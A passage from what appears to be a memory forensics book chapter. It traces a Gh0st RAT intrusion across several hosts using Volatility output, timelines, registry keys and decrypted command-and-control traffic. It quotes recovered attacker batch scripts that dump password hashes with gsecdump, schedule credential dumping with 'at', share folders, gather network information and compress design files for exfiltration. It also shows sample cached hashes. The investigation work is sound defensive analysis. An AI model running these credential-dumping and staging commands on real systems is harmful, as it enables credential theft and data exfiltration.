Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 276
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 508
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 528
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 536
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 652
Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 936
```

If you list the DLLs for the process with PID 1024, you see that `6to4ex.dll` is in fact loaded.

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin dlllist -p 1024
Volatility Foundation Volatility Framework 2.4
************************************************************************
svchost.exe pid:   1024
Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs
Service Pack 3

Base             Size  LoadCount Path
---------- ---------- ---------- ----
0x01000000     0x6000     0xffff C:\WINDOWS\System32\svchost.exe
0x7c900000    0xaf000     0xffff C:\WINDOWS\system32\ntdll.dll
[snip]
0x10000000    0x1c000        0x1 c:\windows\system32\6to4ex.dll
[snip]
```

You can also check to see if there is a `6to4` service running using the `svcscan` plugin. As shown in the following output, the service was indeed running. Based on its order number, 228, you can also tell it was created *after* the system last booted (that is, it’s new). As discussed in Chapter 12, the order number should be consistent with the service name’s alphabetical order. In this case, `6to4` should have a very low order number, but on the contrary, it’s quite high. Also, because the service starts within a second of the `SYMANTEC-1.43-1[2].EXE` executable running on the system, it’s a good indication that the artifacts are related:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin svcscan
[snip]
Offset: 0x389d60
Order: 228
Process ID: 1024 
Service Name: 6to4 
Display Name: Microsoft Device Manager
Service Type: SERVICE_WIN32_SHARE_PROCESS
Service State: SERVICE_RUNNING
Binary Path: C:\WINDOWS\System32\svchost.exe -k netsvcs
[snip]
```

At this point, you have identified the origin of the suspicious network activity, the process responsible for the activity, how the malicious code was introduced to the system, the persistence mechanism, and a time range during which the malware was active.

### Finding an Active Attacker

If you continue to look for artifacts in close temporal proximity, you notice a number of events that indicate active use of the malware by remote attackers. For example, a directory named `WINDOWS\webui` appears on the system, the `ipconfig.exe` utility was accessed, and another executable was downloaded (`ps.exe`). The `ps.exe` executable will be encountered again later in the analysis. During this time period, a Prefetch file for the `net` command was also created. The `net` command provides a variety of capabilities, including adding new user accounts, viewing domains, and adding network shares. Here is the relevant output:

```
Mon Nov 26 2012 23:03:10,macb,[ENG MFT FILE_NAME] WINDOWS\webui 
    (Offset: 0x1bc21000)
Mon Nov 26 2012 23:03:21,.a..,[MFT STD_INFO] WINDOWS\system32\ipconfig.exe 
    (Offset: 0xc826400)
Mon Nov 26 2012 23:06:34,macb,[ENG MFT FILE_NAME] WINDOWS\ps.exe 
    (Offset: 0x15983800)
[snip]
Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \NET.EXE-01A53C2F.pf (Offset: 0x12d588)
```

Based on these new system events, you can expand the investigation. For example, if you search for the directory that was created (`webui`), you might notice that several other files appeared in that directory over the subsequent two hours:

```
$ mactime -b ENG_all -d -z UTC \
       | grep -i webui | grep FILE_NAME
Mon Nov 26 2012 23:06:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\gs.exe 
    (Offset: 0x16267c00)
Mon Nov 26 2012 23:06:52,macb,[ENG MFT FILE_NAME] WINDOWS\webui\ra.exe 
    (Offset: 0x17779c00)
Mon Nov 26 2012 23:06:56,macb,[ENG MFT FILE_NAME] WINDOWS\webui\sl.exe 
    (Offset: 0x1f5ff000)
Mon Nov 26 2012 23:06:59,macb,[ENG MFT FILE_NAME] WINDOWS\webui\wc.exe 
    (Offset: 0x1f5ff400)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll 
   (Offset: 0x109cf7a8)
Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll 
   (Offset: 0x10b97400)
Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x10b97800)
```

There are also artifacts suggesting that some of these executables (in particular, `SL.EXE` and `GS.EXE`) were run immediately after being downloaded to the system:

```
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wshtcpip.dll 
    (Offset: 0x32cfc00)
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\mswsock.dll 
    (Offset: 0x330d000)
Mon Nov 26 2012 23:10:25,.a..,[ENG MFT STD_INFO] WINDOWS\system32\hnetcfg.dll 
    (Offset: 0x32fe000)
Mon Nov 26 2012 23:10:35,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \SL.EXE-010E2A23.pf (Offset: 0x311400)
Mon Nov 26 2012 23:11:58,.a..,[ENG Registry] SECURITY\Policy\Secrets
Mon Nov 26 2012 23:11:58,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \GS.EXE-3796DDD9.pf (Offset: 0x311800)
```

The `Policy\Secrets` key of the `SECURITY` hive was accessed the same time as the `GS.EXE` file was executed. This suggests that the `GS.EXE` executable might be accessing the Local Security Authority (LSA) secrets, which an attacker can use to extract cached password domain hashes. Using the `cachedump` plugin, you can gain insight into what password hashes the attacker might have been able to access:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin cachedump
Volatility Foundation Volatility Framework 2.4
administrator:00c2bcc2230054581d3551a9fdcc48f093:petro-market:petro-market.org
callb:178526e1cb2fdfc36d764595f1ddd0f7:petro-market:petro-market.org
```

You can gain more insight into the `GS.EXE` executable by extracting it from memory. If the process is currently running, you can just dump it with `procdump`, as discussed in Chapter 8. Otherwise, you need to find the physical offset of its `_FILE_OBJECT` using `filescan`:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin 
    filescan | grep -i \\\\gs.exe

Volatility Foundation Volatility Framework 2.4 
0x020bb938   1  0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
0x18571938   1  0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
```

Next, you can pass that offset (`0x020bb938`) to the `dumpfiles` plugin to extract the memory manager’s cached copy of this file from disk:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin 
     dumpfiles -Q 0x020bb938 -D ENG_OUT/

Volatility Foundation Volatility Framework 2.4 
ImageSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
DataSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
```

After the file is extracted, you can use the `strings` utility to gain some initial insights into the executable’s capabilities:

```
$ strings -a file.None.0x822cf6e8.img > gs.strings
$ strings -a –el file.None.0x822cf6e8.img >> gs.strings
$ cat gs.strings
[snip]
unable to start gsecdump as service
system
help
dump_all,a
dump all secrets
dump_hashes,s
dump hashes from SAM/AD
dump_lsa,l
dump lsa secrets
dump_usedhashes,u
dump hashes from active logon sessions
dump_wireless,w
dump microsoft wireless connections
help,h
show help
system,S
run as localsystem
gsecdump v0.7 by Johannes Gumbel (johannes.gumbel@truesec.se)
usage: gsecdump [options]
[snip]
```

Based on the `strings` output, the `GS.EXE` executable appears to be the `gsecdump` utility ([http://en.truesec.com/Tools/Tool/gsecdump_v2.0b5](http://en.truesec.com/Tools/Tool/gsecdump_v2.0b5)), which would explain why the `Policy\Secrets` key was being accessed. The `gsecdump` tool accesses the registry key in a way that changes the `LastWriteTime` without changing its data. It provides a useful temporal fingerprint about the execution of this tool.

Further exploration of the timeline and the events in close proximity reveals more artifacts to support the theory of hash dumping. For example, the artifacts suggest that both `samsrv.dll` and `cryptdll.dll` (DLLs often used for dumping password hashes stored within the SAM) were accessed at `23:11:58`, which is the same time `GS.EXE` executed.

```
Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\samsrv.dll 
    (Offset: 0x329f000)
Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\cryptdll.dll 
    (Offset: 0x3329c00)
```

### Mapping Remote File Shares

You might also notice the artifacts just a few minutes later associated with `ping.exe`, which suggests that the attacker(s) may have been attempting to verify their ability to reach other systems on the network:

```
Mon Nov 26 2012 23:15:41,.a..,[ENG MFT STD_INFO] WINDOWS\system32\ping.exe 
    (Offset: 0x334dc00)
Mon Nov 26 2012 23:15:44,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \PING.EXE-31216D26.pf (Offset: 0x311c00)
```

As you work through the subsequent timeline artifacts, you may notice references to `PS.EXE`—one of the initial downloads. Immediately before it is accessed, a few registry keys are modified, such as `Sysinternals` and `Sysinternals\PsExec`. The `PsExec` tool enables you to run programs on remote machines (see [http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx)). This suggests that `ps.exe` is probably a renamed copy of `PsExec`. In addition, a file (`system.dll`) was also created on the machine. Keep this in mind, and we’ll come back to it later in the chapter:

```
Tue Nov 27 2012 00:00:54,.a..,[ENG Registry] $$$PROTO.HIV\Software\Sysinternals
Tue Nov 27 2012 00:00:54,.a..,[ENG Registry]
$$$PROTO.HIV\Software\Sysinternals\PsExec
[snip]
Tue Nov 27 2012 00:00:57,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \PS.EXE-09745CC1.pf (Offset: 0x924e400)
Tue Nov 27 2012 00:07:03,.a..,[ENG MFT STD_INFO] WINDOWS\ps.exe 
    (Offset: 0x15983800)
Tue Nov 27 2012 00:09:55,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wbem 
    (Offset: 0x3156400)
Tue Nov 27 2012 00:10:44,mac.,[ENG MFT STD_INFO] WINDOWS\Temp 
    (Offset: 0x3159000)
Tue Nov 27 2012 00:44:16,m...,[ENG MFT STD_INFO] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
```

Other artifacts in the timeline show that the `Network` registry key was modified, and a symbolic link was created. This is consistent with what you expect to see if a share was mounted over the network:

```
Tue Nov 27 2012 00:48:19,.a..,[ENG Registry] $$$PROTO.HIV\Network
Tue Nov 27 2012 00:48:19,macb,[ENG SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 185218568/Ptr: 1/Hnd: 0
Tue Nov 27 2012 00:49:28,.a..,[ENG Registry] 
    $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer
    \MountPoints2\##172.16.223.47#z
```

As you can see, the remote machine’s IP was 172.16.223.47 and both the target and source drive letter was `Z`. When Windows maps a remote drive like this, a subkey named `z` should be created under the `Network` key. Thus, if you examine `Network\z`, you can recover the IP address of the machine that contains the remote share and the username used to connect to it. This is useful for verifying the accounts that were compromised.

The registry key also shows that this connection was created using the `net use` command for a persistent connection. You can determine this based on the values for `ProviderType`, `ConnectionType`, and `DeferFlags`. Specifically, `0x20000` for `ProviderType` means LanMan, `1` for `ConnectionType` means drive redirection, and `4` for `DeferFlags` means the credentials have been saved:

---

**NOTE**

You can find out more about these registry values here: [http://sysadminslibrary.blogspot.com/2013/02/mapped-network-drives-in-windows-7.html](http://sysadminslibrary.blogspot.com/2013/02/mapped-network-drives-in-windows-7.html)

---

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey -K "network\z"
Volatility Foundation Volatility Framework 2.4 
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\default
Key name: z (S)
Last updated: 2012-11-27 00:48:20 UTC+0000

Subkeys:

Values:
REG_SZ        RemotePath      : (S) \\172.16.223.47\z
REG_SZ        UserName        : (S) PETRO-MARKET\ENG-USTXHOU-148$
REG_SZ        ProviderName    : (S) Microsoft Windows Network
REG_DWORD     ProviderType    : (S) 131072 (0x20000)
REG_DWORD     ConnectionType  : (S) 1
REG_DWORD     DeferFlags      : (S) 4
```

At this point, you have determined that the attacker acquired valid credentials and used them to mount remote file shares.

### Scheduled Jobs for Hash Dumping

Still other files within the original `webui` folder can help expand the scope of the investigation. For example, there was also a batch script in that directory named `system5.bat`:

```
$ mactime -b ENG_all -d -z UTC \
       | grep -i webui | grep FILE_NAME
[snip]
Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x10b97800)
```

This file happens to be resident in the MFT and was extracted when the `mftparser` plugin was originally run. You can find it in the output directory using the offset of the MFT entry (`0x10b97800`):

```
$ ls ENG_FILES/*0x10b97800*
file.0x10b97800.data0.dmp

$ cat ENG_FILES/file.0x10b97800.data0.dmp
@echo off
copy c:\windows\webui\wc.exe c:\windows\system32
at 19:30 wc.exe -e -o h.out
```

From the recovered script, you can see that the attacker was using the `at` command to create a Job on the system. If you examine the events in the timeline immediately after the `system5.bat` file was created, you find artifacts associated with the Job file (`At1.job`) and the `at` command:

```
Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] WINDOWS\Tasks\At1.job 
    (Offset: 0x12ab2000)
Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
```

Subsequently, you can also find related artifacts such as the created process, the `At1.job` file being accessed, the creation of the `h.out` file, and the creation of the `WC.EXE-06BFE764.pf` Prefetch file for `wc.exe`:

```
Tue Nov 27 2012 01:30:00,macb,[ENG PROCESS LastTrimTime] wc.exe 
    PID: 364/PPID: 1024/POffset: 0x02049690
Tue Nov 27 2012 01:30:00,.acb,[ENG PROCESS] wc.exe 
    PID: 364/PPID: 1024/POffset: 0x02049690
Tue Nov 27 2012 01:30:00,.a..,[ENG Registry] 
$$$PROTO.HIV\Microsoft\SchedulingAgent
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] csrss.exe PID: 604/TID: 1248
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 492
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] wc.exe PID: 364/TID: 2004
Tue Nov 27 2012 01:30:00,.ac.,[ENG MFT STD_INFO] WINDOWS\system32\wc.exe 
    (Offset: 0x10b97c00)
Tue Nov 27 2012 01:30:00,mac.,[ENG MFT STD_INFO] WINDOWS\Tasks\At1.job 
    (Offset: 0x12ab2000)
Tue Nov 27 2012 01:30:00,macb,[ENG MFT FILE_NAME] WINDOWS\system32\h.out 
    (Offset: 0x12ab2800)
Tue Nov 27 2012 01:30:10,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
```

In the preceding output, notice that the `SchedulingAgent` registry key gets modified after the `wc.exe` process is created. You can examine the contents of the key with the `printkey` plugin:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
     -K "Microsoft\SchedulingAgent"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
Key name: SchedulingAgent (S)
Last updated: 2012-11-27 01:30:00 UTC+0000

Subkeys:

Values:
REG_EXPAND_SZ TasksFolder     : (S) %SystemRoot%\Tasks
REG_EXPAND_SZ LogPath         : (S) %SystemRoot%\SchedLgU.Txt
REG_DWORD     MinutesBeforeIdle : (S) 15
REG_DWORD     MaxLogSizeKB    : (S) 32
REG_SZ        OldName         : (S) ENG-USTXHOU-148
REG_DWORD     DataVersion     : (S) 3
REG_DWORD     PriorDataVersion : (S) 0
REG_BINARY    LastTaskRun     : (S) 
0x00000000  dc 07 0b 00 01 00 1a 00 13 00 1e 00 01 00 00 00   ................
```

The `LastTaskRun` registry value is updated when a task is run on the system. The data is stored in the same date format as the dates stored in the Job files ([http://msdn.microsoft.com/en-us/library/cc248286.aspx](http://msdn.microsoft.com/en-us/library/cc248286.aspx)). The time is set according to the machine’s local time. You can use the Registry API, described in Chapter 10, to get the raw timestamp and the `jobparser.py` script ([https://raw.github.com/gleeda/misc-scripts/master/misc_python/jobparser.py](https://raw.github.com/gleeda/misc-scripts/master/misc_python/jobparser.py)) to translate the date, as shown in the following output:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin volshell
Volatility Foundation Volatility Framework 2.4
[snip]
>>> import volatility.plugins.registry.registryapi as registryapi
>>> import jobparser as jobparser
>>> regapi = registryapi.RegistryApi(self._config)
>>> dateraw = regapi.reg_get_value(hive_name = "software", key =   
      "Microsoft\\SchedulingAgent", value = "LastTaskRun")
>>> print jobparser.JobDate(dateraw)
Monday Nov 26 19:30:01.0 2012
```

You can find the machine’s local time by running the `imageinfo` plugin:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin imageinfo
Volatility Foundation Volatility Framework 2.4
[snip]
           Image date and time : 2012-11-27 01:57:28 UTC+0000
     Image local date and time : 2012-11-26 19:57:28 -0600
```

Because the machine’s local time is six hours behind UTC time (-0600), you can see that the time stored in the `LastTaskRun` value (19:30:01) is consistent with the UTC creation time for the `wc.exe` process and the aforementioned files (01:30:00).

To gain further insight into `wc.exe`, you can try to extract the file referenced in the bat script `h.out`. Using the MFT entry offset found in the timeline, you can determine whether the file was resident in the MFT:

```
Tue Nov 27 2012 01:30:00,560,macb,,0,0,11742,[ENG MFT FILE_NAME] 
WINDOWS\system32\h.out (Offset: 0x12ab2800)

$ ls ENG_FILES/*0x12ab2800*
ENG_FILES/file.0x12ab2800.data0.dmp

$ cat ENG_FILES/file.0x12ab2800.data0.dmp
callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
 913EA458A16E7
ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
 5252FA87ED40AF8C46D8B1E2
sysbackup:current:C2A3915DF2EC79EE73108EB48073ACB7:E7A6F270F1BA562A90E2
 C133A95D2057
```

In this instance, the file was small enough to be MFT-resident. If it were not resident, and you wanted to learn more about `wc.exe`, you could have tried extracting `h.out` or `wc.exe` with the `dumpfiles` plugin. Notice that the contents of `h.out` resemble password hashes—an indication that the attacker might attempt to move laterally within the organization. In the following sections, you have to look for indications of what other machines may be involved.

### Overlaying Attack Artifacts

To further the investigation, you might want to expand the scope to determine whether the other systems were involved. The artifacts, temporal patterns, and time ranges generated from the first system can help aid that analysis. Because you know the attacker first gained access to the `ENG-USTXHOU-148` system using a file called `SYMANTEC-1.43-1[2].EXE`, you can search for similar filenames within the other timelines. For example, in the following output, you see one hit associated with a Prefetch file artifact found in the `FLD_all` file. This suggests that the `FLD-SARIYADH-43` system might have also been compromised:

```
$ grep -Hi symantec IIS_all FLD_all | cut -d\| -f1,2
FLD_all:0|[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-330FB7E3.pf 
    (Offset: 0x1d75cc00)
```

In the timeline for `FLD-SARIYADH-43`, notice the same `6to4` service was created. These changes were also followed by the creation of the `svchost.exe` threads:

```
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
    $$$PROTO.HIV\ControlSet001\Services\6to4
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Security
Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe 
    PID: 1032/TID: 152 
Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe 
    PID: 1032/TID: 1920
```

The artifacts found in the `FLD-SARIYADH-43` timeline continue to correlate closely with the events seen earlier in the `ENG-USTXHOU-148` timeline, including the following:

- Creation of the `C:\WINDOWS\webui` folder containing the same executables
- Network reconnaissance using the `sl.exe`, `gs.exe`, and `wc.exe` executables
- Execution of the `ipconfig.exe` and `net.exe` commands
- Usage of the `ps.exe` binary (`PsExec`)

Notice some important changes in the attacker’s actions, however. For example, the attackers have placed a different collection of batch files on the system:

```
Tue Nov 27 2012 00:31:39,macb,[FLD MFT FILE_NAME] WINDOWS\system1.bat 
    (Offset: 0x1787f000)
Tue Nov 27 2012 00:33:32,macb,[FLD MFT FILE_NAME] 
    WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x1787f400)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT STD_INFO] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:53:29,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat 
    (Offset: 0x1787fc00)
Tue Nov 27 2012 00:59:00,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat 
    (Offset: 0x1b773000)
Tue Nov 27 2012 01:04:59,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat 
    (Offset: 0x1b773400)
Tue Nov 27 2012 01:19:41,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x1b773800)
```

Leveraging the MFT offset information found in these entries, you can see whether any of these new files were MFT-resident. In this example, the scripts were small enough that they were resident and accessible in the `mftparser` output directory. The first file (`system1.bat`) sets up the `C:\WINDOWS\webui` folder as a network share:

```
$ cat file.0x1787f000.data0.dmp
@echo off
mkdir c:\windows\webui
net share z=c:\windows\webui /GRANT:sysbackup,FULL
```

The `system6.bat` script collects network information (reconnaissance) about this machine and saves the output into a fake `system.dll` file:

```
$ cat file.0x1787f800.data0.dmp
@echo off
ipconfig /all >> c:\windows\webui\system.dll
net share >> c:\windows\webui\system.dll
net start >> c:\windows\webui\system.dll
net view >> c:\windows\webui\system.dll
```

The `system2.bat` file runs `gs.exe` and dumps the output into a fake `svchost.dll` file. You know from the analysis of `ENG-USTXHOU-148` that `gs.exe` is actually `gsecdump.exe`, a password hash-dumping utility:

```
$ cat file.0x1787fc00.data0.dmp
@echo off
c:\windows\webui\gs.exe -a >> c:\windows\webui\svchost.dll
```

The `system3.bat` script generates a file listing for all files with a `dwg` extension. This extension is commonly used for AutoCAD drawing files and can contain proprietary designs. The output is then saved into a fake `https.dll` file:

```
$ cat file.0x1b773000.data0.dmp
@echo off 
dir /S C:\*.dwg > c:\windows\webui\https.dll
```

Based on the command-line invocation, the `system4.bat` script appears to be using WinRAR to copy, compress, and encrypt the files found in the `C:\Engineering\Designs\` directory whose filename contains the word `Pumps`. This is a technique attackers commonly use as they prepare to exfiltrate data:

```
$ cat file.0x1b773400.data0.dmp
@echo off 
c:\windows\webui\ra.exe a -hphclllsddlsdiddklljh -r 
 c:\windows\webui\netstat.dll "C:\Engineering\Designs\Pumps" -x*.dll
```

Finally, the `system5.bat` file is exactly the same as the one you recovered from the `ENG-USTXHOU-148` machine earlier:

```
$ cat file.0x1b773800.data0.dmp
@echo off
copy c:\windows\webui\wc.exe c:\windows\system32
at 04:30 wc.exe -e -o h.out
```

Around the same time that the batch files appear on the `FLD-SARIYADH-43` machine, you can see that the attacker connects to the `IIS-SARIYADH-03` machine:

```
Tue Nov 27 2012 00:46:10,0,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:46:10,0,macb,[FLD SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 284628328/Ptr: 1/Hnd: 0
```

Later in the timeline, you can also find temporal artifacts showing that the `system5.bat` file was executed using the `At1.job` file and the `at` command:

```
Tue Nov 27 2012 01:21:18,616,macb,[FLD MFT FILE_NAME] WINDOWS\Tasks\At1.job 
    (Offset: 0x1af18000)
Tue Nov 27 2012 01:21:18,472,macb,[FLD MFT FILE_NAME] 
WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x1af18400)
```

Leveraging the information from the `ENG-USTXHOU-148` timeline enables you to rapidly confirm and correlate the events seen within the `FLD-SARIYADH-43` timeline. At this point, you have indications that the attackers were accessing `IIS-SARIYADH-03`, but you do not have any artifacts associated with the `SYMANTEC-1.43-1[2].EXE` file. It might be a good opportunity to combine the timelines and put the temporal events from `IIS-SARIYADH-03` in the context of what you know about the other systems. It might also be advantageous to introduce the temporal artifacts extracted from the packet capture.

### Decoding the Network Data

Based on your analysis of `ENG-USTXHOU-148` and `FLD-SARIYADH-43`, you have started to construct theories about what the attackers were doing within the infrastructure. That analysis also provided valuable context for finding the remaining artifacts associated with `IIS-SARIYADH-03`. You can create a combined timeline from the host timelines and the packet capture artifacts using the following steps:

```
$ cat pcap.body *_all >> combined.body

$ mactime –b combined.body –d –z UTC 
```

Because you know the initial attack vector was a phishing e-mail with a download link to `SYMANTEC-1.43-1[2].EXE`, you can once again search for it in the combined timeline to find any events that occurred in close temporal proximity. In particular, notice the network activity associated with the suspicious IP address initially identified in the IDS alert (`58.64.132.141`). Based on the timestamps in the following data, it appears that this IP was not only used for the initial dropper but also for continued communication with the compromised host:

```
Mon Nov 26 2012 23:01:58,0,.acb,,0,0,0,[ENG THREAD] svchost.exe 
    PID: 1024/TID: 804
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP SYN packet 172.16.150.20:1097 -> 58.64.132.141:80 
    seq [2669490555] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490715] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x18: PUSH ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<58.64.132.141> TCP packet flags [0x12: SYN ACK ] 58.64.132.141:80 
    -> 172.16.150.20:1097 seq [1849965829] (file: jackcr-challenge.pcap)
[snip]
```

Given the volume of traffic and the fact that it is interspersed with other system events, the communication channel is most likely being used for command and control. To further investigate the traffic, load it into Wireshark (shown in [Figure 18-1](#figure18-1)). When you follow the TCP streams, however, it appears obfuscated. Each message appears to have a header containing the string `Gh0st`.

![c18f001.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c18/c18f001.png)

*[**Figure 18-1:**](#figureanchor18-1) Following a TCP stream in Wireshark that contains encrypted Gh0st network traffic*

Luckily, this is commonly encountered command and control traffic associated with the Gh0st RAT and can be easily decoded using Chopshop ([https://github.com/MITRECND/chopshop](https://github.com/MITRECND/chopshop)). The following output shows how to leverage the Chopshop Gh0st decoder:

```
$ chopshop -f jackcr-challenge.pcap gh0st_decode -F decrypted.txt
```

At this point, the decrypted traffic has been extracted to `decrypted.txt`. By examining the decrypted command and control traffic, you can verify your theories about what happened during the incident. For example, you can find the creation of the `C:\WINDOWS\webui` directory and the execution of the `ipconfig` in packets 7–29. Now you can see the commands in bold that the attacker issued to this machine:

```
C:\WINDOWS\system32>
cd ..
C:\WINDOWS>
mkdir webui
C:\WINDOWS>
cd webui
C:\WINDOWS\webui>
ipconfig
Windows IP Configuration

Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . :  
        IP Address. . . . . . . . . . . . : 172.16.150.20
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 172.16.150.2
```

You can see a flurry of network traffic before every event on the `ENG-USTXHOU-148` system. When you split the traffic as previously described, you can easily discern why. You can see the attacker upload files and check that they were successfully uploaded. The Gh0st RAT appears to give a progress meter as the file is uploaded, so you see several lines of `COMMAND: FILE DATA (8183)`and `TOKEN: DATA CONTINUE`:

```
[snip]
COMMAND: FILE SIZE (C:\WINDOWS\ps.exe: 381816)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
TOKEN: DATA CONTINUE
[snip]
COMMAND: FILE SIZE (C:\WINDOWS\webui\gs.exe: 303104)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
TOKEN: DATA CONTINUE
[snip]
COMMAND: LIST FILES (C:\WINDOWS\webui\)
TOKEN: FILE LIST
TYPE    NAME    SIZE    WRITE TIME
FILE    gs.exe  303104  129984448080090049
COMMAND: FILE SIZE (C:\WINDOWS\webui\ra.exe: 403968)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
[snip]
```

